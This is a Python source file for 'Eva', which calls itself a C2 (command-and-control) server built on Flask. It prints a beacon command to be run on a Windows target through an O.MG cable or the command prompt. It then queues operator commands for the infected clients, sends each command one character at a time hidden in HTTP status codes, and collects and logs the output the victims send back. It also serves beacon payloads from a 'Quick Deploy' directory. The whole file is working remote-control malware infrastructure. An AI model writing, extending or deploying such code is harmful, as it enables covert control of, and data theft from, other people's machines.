"""
Eva - Python C2 Server (via Flask Webhook)

Copyright (C) 2025 Trigat
"""

from flask import Flask, abort, request, Response, send_from_directory
from datetime import datetime
import deploy_beacon
import base64
import sys
import os

app = Flask(__name__)

current_command = {}
client_output_log = {}  # Stores output per client

os_map = {"win": "w", "lin": "l", "mac": "m", "w": "w", "l": "l", "m": "m"}
os_fullname = {"w": "win", "l": "lin", "m": "mac"}

current_dir = os.path.dirname(__file__)

if len(sys.argv) > 1:
    server_url = f"{sys.argv[1]}"
else:
    from deploy_beacon import get_local_ip
    server_url = f"http://{get_local_ip()}:8000"

beacon_code = deploy_beacon.generate_http_cmd(server_url)

print("\n[*] Execute this command on Windows target via O.MG or command prompt:\n")
print(beacon_code.strip() + "\n\n")

print(f"More beacons can be found in the server's local /qd/ (Quick Deploy) directory.\n\n")

@app.route("/cmd/<b64>", methods=["GET"])
def set_cmd(b64):
    try:
        decoded = base64.b64decode(b64.encode()).decode()
        for cid in current_command.keys():
            current_command[cid] = decoded
        print(f"[+] Set command for all clients: {repr(decoded)}")
        return "OK\n"
    except Exception as e:
        print(f"[!] Decode error: {e}")
        return "ERROR\n", 400

@app.route("/cmd/<os>/<b64>", methods=["GET"])
def set_cmd_by_os(os, b64):
    try:
        if os not in ("w", "l", "m", "win", "lin", "mac"):
            return "Invalid\n", 40
        decoded = base64.b64decode(b64.encode()).decode()
        os = os_map.get(os.lower())
        target_os = os.lower()
        for cid in current_command.keys():
            if cid.startswith(target_os):
                current_command[cid] = decoded
        print(f"[+] Set command for {os_fullname[target_os].upper()} clients: {repr(decoded)}")
        return "OK\n"
    except Exception as e:
        print(f"[!] Decode error: {e}")
        return "ERROR\n", 400

@app.route("/poll", methods=["GET"])
def poll():
    cid = request.headers.get("X-Client")
    if not cid:
        return "[!] Missing X-Client header\n", 400

    # Receive result from client
    output = request.headers.get("X-Output")
    if output:
        try:
            result = base64.b64decode(output).decode()
            client_output_log.setdefault(cid, "")
            client_output_log[cid] += result + "\n"
            os_tag = cid.split("-")[0]
            with open("log/log.txt", "a", encoding="utf-8") as f:
                f.write(
                    f"\n{datetime.now().isoformat()}"
                    f"\n[{cid} - {os_fullname[os_tag].upper()} - OUTPUT]"
                    f"\n{result}\n"
                )
            print(f"[{cid} OUTPUT]\n{result}")
        except Exception as e:
            print(f"[!] Decode error from {cid}: {e}")

    # Initialize command buffer if missing
    current_command.setdefault(cid, "")

    # Send next character of command
    if current_command[cid]:
        char = current_command[cid][0]
        current_command[cid] = current_command[cid][1:]
        code = 200 + ord(char)
        print(f"[>] Sending char: {repr(char)} as status code {code}")
        return "", code
    else:
        return "", 204

@app.route("/cmd/hook", methods=["GET"])
def view_output():
    if not client_output_log:
        return Response("[No output received yet]", mimetype="text/plain")

    output = ""
    for cid, log in client_output_log.items():
        os_tag = cid.split("-")[0]
        output += f"== Client {cid} - {os_fullname[os_tag].upper()} ==\n{log}\n"
    return Response(output.strip(), mimetype="text/plain")

@app.route("/log/log.txt", methods=["GET"])
def local_log_access():
    if request.remote_addr != '127.0.0.1':
        abort(403)

    try:
        with open("log/log.txt", "r", encoding="utf-8") as f:
            content = f.read()
        return Response(content, mimetype="text/plain")
    except FileNotFoundError:
        return Response("[Log file not found]", mimetype="text/plain")

@app.route("/cmd/clean", methods=["GET"])
def clear_output():
    client_output_log.clear()
    try:
        open("log/log.txt", "w").close()
    except Exception as e:
        print(f"[!] Error clearing log file: {e}")
    return "Output cleared\n"

# Quick Deploy
@app.route("/qd/<path:filename>", methods=["GET"])
def serve_qd_file(filename):
    qd_path = os.path.join(current_dir, "qd")
    return send_from_directory(qd_path, filename)

def write_qd(path, content):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content.strip())

@app.route("/qd", methods=["GET"])
def list_qd_files():
    if request.remote_addr != "127.0.0.1":
        abort(403)

    qd_path = os.path.join(current_dir, "qd")
    try:
        files = os.listdir(qd_path)
        if not files:
            return Response("[No payloads available]", mimetype="text/plain")
        listing = "\n".join(f"http://{request.host}/qd/{f}" for f in files)
        return Response(listing, mimetype="text/plain")
    except Exception as e:
        return Response(f"[!] Error: {e}", mimetype="text/plain")

write_qd(current_dir + '/qd/qd_http.cmd', beacon_code)
write_qd(current_dir + '/qd/qd_http.py', deploy_beacon.generate_http_python(server_url))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
